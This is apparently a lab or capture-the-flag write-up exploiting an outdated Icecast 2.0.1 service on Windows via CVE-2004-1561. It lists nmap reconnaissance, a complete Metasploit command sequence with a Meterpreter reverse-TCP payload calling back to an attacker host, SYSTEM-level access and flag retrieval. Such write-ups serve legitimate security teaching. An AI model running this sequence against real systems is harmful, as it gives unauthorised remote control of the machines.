@@ -1,0 +1,60 @@
+OS: Windows
+Date: 08.10.2026
+
+1. Reconnaissance
+
+Nmap scan:
+
+nmap -sV -sC -p- <IP>
+
+Open ports (key ones):
+
+135, 139, 445 — Windows RPC/SMB
+3389          — RDP
+7873          — Icecast 2.0.1 (streaming media server)
+
+The standout is Icecast 2.0.1 on an unusual port — old version, known to be vulnerable.
+
+2. Enumeration
+
+SMB enum (nmap scripts / smbclient -L, enum4linux) — no useful open shares or anonymous access of note.
+
+Icecast 2.0.1 is vulnerable to a known buffer overflow:
+
+CVE-2004-1561 — Icecast < 2.0.2 Header Processing Buffer Overflow
+
+Confirmed via searchsploit icecast, which returns a matching Metasploit module.
+
+3. Exploitation
+
+Used Metasploit:
+
+msfconsole
+use exploit/windows/http/icecast_header
+set RHOSTS <IP>
+set RPORT 7873
+set LHOST <attacker IP>
+set payload windows/meterpreter/reverse_tcp
+run
+
+The exploit lands directly as a working session — on this box Icecast runs with high privileges, so the resulting shell comes back as:
+
+NT AUTHORITY\SYSTEM
+4. Privilege Escalation
+
+Not required — the Icecast service was already running as SYSTEM, so the initial exploit gives full admin-level access in one step. No further privesc chain is needed here; this is the “lesson” of the room.
+
+5. Flags
+
+From the meterpreter shell:
+
+shell
+type C:\Users\Administrator\Desktop\root.txt
+
+(and the user flag, typically on another user’s Desktop or home directory, located via search -f user.txt in meterpreter.)
+
+6. Lessons Learned
+Always check for outdated software on unusual ports — Icecast on 7873 was the giveaway here.
+A known CVE + public Metasploit module made exploitation a one-liner.
+Services running with excessive privileges (SYSTEM) turn a simple RCE into instant full compromise — no privesc phase needed.
+searchsploit <service+version> is a fast first move once you fingerprint a service version.
